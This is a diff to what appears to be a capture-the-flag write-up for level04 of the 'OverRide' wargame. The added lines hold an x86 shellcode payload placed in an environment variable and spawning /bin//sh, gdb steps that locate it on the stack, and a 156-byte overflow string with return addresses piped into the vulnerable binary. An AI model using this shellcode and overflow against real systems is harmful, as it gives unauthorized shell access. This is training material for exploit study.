@@ -209,4 +209,21 @@ Dump of assembler code for function main:
    0x08048825 <+349>:	ret
 End of assembler dump
 
-.
+level04@OverRide:~$ env -i payload=$(python -c "print('\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')") gdb level04
+(gdb) b *main
+Breakpoint 1 at 0x80486c8
+(gdb) run
+Starting program: /home/users/level04/level04
+
+Breakpoint 1, 0x080486c8 in main ()
+(gdb) x /200s environ
+...
+0xffffdb87:	 "payload=\220\220\220\220\2...
+...
+
+0xffffdf6f
+
+python -c "print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
+python -c "print('A' * 156 + '\x1a\x88\x04\x08' + '\x4f\xdc\xff\xff')"
+
+level04@OverRide:~$ python -c "print('A' * 156 + '\x1a\x88\x04\x08' + '\x4f\xdc\xff\xff')" | env -i payload=$(python /tmp/payload.py) ./level04
